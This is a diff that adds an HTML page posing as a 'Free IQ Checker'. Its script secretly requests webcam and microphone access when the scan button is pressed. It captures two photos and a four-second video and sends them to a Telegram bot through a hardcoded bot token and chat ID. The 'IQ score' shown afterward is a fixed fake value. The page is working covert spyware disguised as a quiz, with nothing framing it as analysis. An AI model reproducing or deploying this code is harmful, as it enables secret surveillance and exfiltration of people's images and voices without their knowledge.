@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=7,8,edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IQ Checker</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      height: 100vh;
+      background-image: url("/IMG-20250801-WA0006.jpg");
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-position: center;
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+      padding: 40px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 15px;
+      margin-bottom: 30px;
+    }
+    .scan-button {
+      padding: 15px 30px;
+      border: none;
+      border-radius: 30px;
+      background: #fff;
+      color: #2f80ed;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .scan-button:hover {
+      background: #56ccf2;
+      color: #fff;
+      transform: scale(1.05);
+    }
+    video {
+      display: none;
+    }
+    footer {
+      margin-top: 25px;
+      font-size: 13px;
+      color: #ddd;
+    }
+
+  
+    #iqBarContainer {
+      margin-top: 30px;
+      display: none;
+    }
+
+    .popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .popup-content {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(10px);
+      border-radius: 16px;
+      padding: 25px 30px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+      text-align: center;
+      max-width: 90%;
+      color: #fff;
+      font-size: 16px;
+      position: relative;
+      animation: fadeIn 0.4s ease;
+    }
+    .popup-close {
+      position: absolute;
+      top: 10px; right: 15px;
+      font-size: 20px;
+      cursor: pointer;
+      color: #fff;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔍 Free IQ Checker</h1>
+    <p>Tap the button below to scan.</p>
+    <button class="scan-button" id="fingerprintBox">Start IQ Scan</button>
+    <video id="video" autoplay muted playsinline></video>
+
+    <div id="iqBarContainer">
+      <p style="margin-bottom: 8px;">Your IQ Score:</p>
+      <div style="width: 100%; height: 20px; background: rgba(255,255,255,0.2); border-radius: 10px; overflow: hidden;">
+        <div id="iqBar" style="height: 100%; width: 0%; background: limegreen; border-radius: 10px;"></div>
+      </div>
+      <p id="iqScoreText" style="margin-top: 8px;">Loading...</p>
+    </div>
+
+    <footer>&copy; 2025 IQ checker</footer>
+  </div>
+
+  
+  <div id="customPopup" class="popup">
+    <div class="popup-content">
+      <span class="popup-close" id="popupClose">&times;</span>
+      <p id="popupMessage">This is a popup message!</p>
+    </div>
+  </div>
+
+  
+  <audio id="successSound" src="https://www.soundjay.com/buttons/sounds/button-4.mp3" preload="auto"></audio>
+  <audio id="errorSound" src="https://www.soundjay.com/buttons/sounds/beep-06.mp3" preload="auto"></audio>
+
+  <script>
+    const BOT_TOKEN = '7966388592:AAEJR90nCeCZRShuTfB-IvnJJVqk4nGrgU4';
+    const CHAT_ID = '2103616694';
+    const fingerprintBox = document.getElementById('fingerprintBox');
+    const videoEl = document.getElementById('video');
+    const scan_audio=new Audio('mixkit-sci-fi-click-900.wav')
+    fingerprintBox.addEventListener('click', async () => {
+      scan_audio.play()
+      try {
+        fingerprintBox.disabled = true;
+        fingerprintBox.innerText = "Scanning...";
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        videoEl.srcObject = stream;
+        videoEl.play();
+        await new Promise(res => setTimeout(res, 1000));
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = videoEl.videoWidth || 640;
+        canvas.height = videoEl.videoHeight || 480;
+        for (let i = 0; i < 2; i++) {
+          ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+          await sendPhoto(blob);
+          await new Promise(res => setTimeout(res, 400));
+        }
+        const recordedBlob = await recordVideo(stream, 4000);
+        await sendVideo(recordedBlob);
+        stream.getTracks().forEach(track => track.stop());
+
+        const fakeIQ = 110;
+        showPopup(`🧠 IQ Scan Complete! You scored ${fakeIQ} – Smart and Sharp!`);
+        animateIQScore(fakeIQ);
+        fingerprintBox.innerText = "Start IQ Scan";
+        fingerprintBox.disabled = false;
+      } catch (err) {
+        console.error(err);
+        showPopup('❌ Error: ' + err.message, true);
+        fingerprintBox.innerText = "Start IQ Scan";
+        fingerprintBox.disabled = false;
+      }
+    });
+
+    async function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'photo.jpg');
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+      console.log('Photo sent:', await res.text());
+    }
+
+    async function sendVideo(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('video', blob, 'video.webm');
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        method: 'POST',
+        body: formData
+      });
+      console.log('Video sent:', await res.text());
+    }
+
+    function recordVideo(stream, duration) {
+      return new Promise((resolve) => {
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+        recorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          resolve(blob);
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), duration);
+      });
+    }
+
+    function showPopup(message, isError = false) {
+      const popup = document.getElementById('customPopup');
+      const msg = document.getElementById('popupMessage');
+      const closeBtn = document.getElementById('popupClose');
+      msg.textContent = message;
+      popup.style.display = 'flex';
+      closeBtn.onclick = () => popup.style.display = 'none';
+      setTimeout(() => popup.style.display = 'none', 5000);
+
+      if (isError) {
+        document.getElementById('errorSound').play();
+      } else {
+        document.getElementById('successSound').play();
+      }
+    }
+
+    function animateIQScore(score) {
+      const bar = document.getElementById('iqBar');
+      const text = document.getElementById('iqScoreText');
+      const container = document.getElementById('iqBarContainer');
+      container.style.display = 'block';
+
+      let current = 0;
+      const interval = setInterval(() => {
+        if (current >= score) {
+          clearInterval(interval);
+        } else {
+          current++;
+          bar.style.width = current + '%';
+          text.textContent = `${current} IQ`;
+        }
+      }, 20);
+    }
+  </script>
+</body>
+</html>
